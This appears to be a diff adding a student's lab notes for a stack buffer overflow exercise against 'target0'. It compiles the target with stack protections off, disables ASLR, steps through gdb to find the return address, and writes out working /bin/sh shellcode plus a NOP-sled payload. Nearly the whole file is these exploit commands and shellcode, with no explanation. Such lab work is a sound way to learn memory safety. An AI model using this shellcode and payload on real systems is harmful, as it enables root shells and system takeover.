@@ -1,0 +1,40 @@
+gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -no-pie -fno-pie -m32 target0.c -o target0
+
+sudo sysctl -w kernel.randomize_va_space=0
+
+gdb -q meet
+
+run `perl -e 'print "A"x400'`
+
+b 8
+
+run `perl -e 'print "A"x400'`
+
+info frame
+
+#  EIP at 0xffffd030
+
+x/64x 0xffffd030-32
+
+perl -e 'print "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";' > sc
+
+run `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"\x74\xdb\xff\xff"x38';`
+
+
+run `perl -e 'print "\x90"x203';``cat sc``perl -e 'print"AAAA"x38';`
+
+0xffffd30c
+
+0xffffd324
+
+x/2000xb $esp
+
+
+gcc -ggdb -m32 sploit0.c -o sploit0 ; echo whoami | ./sploit0
+
+catch exec
+run
+x/x *(char**)environ
+b 10
+c 
+0xffffdf9b
